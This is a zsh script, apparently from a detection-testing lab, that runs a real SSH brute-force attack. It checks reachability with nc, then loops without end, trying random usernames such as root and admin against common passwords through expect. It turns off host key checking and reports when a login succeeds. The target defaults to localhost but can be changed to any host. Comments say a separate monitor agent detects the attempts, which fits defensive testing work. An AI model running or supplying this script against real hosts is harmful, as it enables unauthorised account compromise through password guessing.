#!/bin/zsh
# ============================================================
# SSH Brute Force Attack Script  (ATTACKER ONLY)
# Performs REAL failed SSH login attempts against a target.
# Does NOT report events — detection happens independently
# via the ssh-monitor agent.
#
# Requirements:
#   - SSH (Remote Login) enabled on target
#
# Usage:  ./scripts/ssh-attack.sh
# Stop:   Ctrl+C
# ============================================================

TARGET="${SSH_TARGET:-127.0.0.1}"
PORT="${SSH_PORT:-22}"
ATTEMPT_DELAY="${ATTEMPT_DELAY:-1}"

USERNAMES=("root" "admin" "ubuntu" "deploy" "postgres" "oracle" "test" "guest" "ftpuser" "mysql" "jenkins" "backup" "www-data" "nagios" "tomcat" "pi" "user" "support")
PASSWORDS=("password" "123456" "admin" "root" "pass123" "letmein" "qwerty" "abc123" "password1" "iloveyou")

echo "============================================"
echo "  SSH Brute Force Attack"
echo "============================================"
echo "Target:    $TARGET:$PORT"
echo "Delay:     ${ATTEMPT_DELAY}s between attempts"
echo ""

if ! nc -z -w2 "$TARGET" "$PORT" 2>/dev/null; then
  echo "ERROR: Cannot connect to $TARGET:$PORT"
  echo "Enable SSH: System Settings > General > Sharing > Remote Login > ON"
  exit 1
fi

echo "SSH is reachable. Starting brute force..."
echo ""

attempt=0

while true; do
  user=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
  pass=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
  attempt=$((attempt + 1))

  echo "[Attempt $attempt] $user:$pass → $TARGET:$PORT"

  # Real SSH connection attempt using expect to send actual password
  /usr/bin/expect -c "
    set timeout 5
    log_user 0
    spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $PORT ${user}@${TARGET}
    expect {
      -re \"assword:\" { send \"${pass}\r\"; exp_continue }
      \"denied\"       { exit 1 }
      timeout          { exit 1 }
      eof              { exit 1 }
    }
  " 2>/dev/null

  if [ $? -eq 0 ]; then
    echo "[!!!] SUCCESS — logged in as $user!"
  else
    echo "[BLOCKED] Auth failed for $user"
  fi

  sleep "$ATTEMPT_DELAY"
done
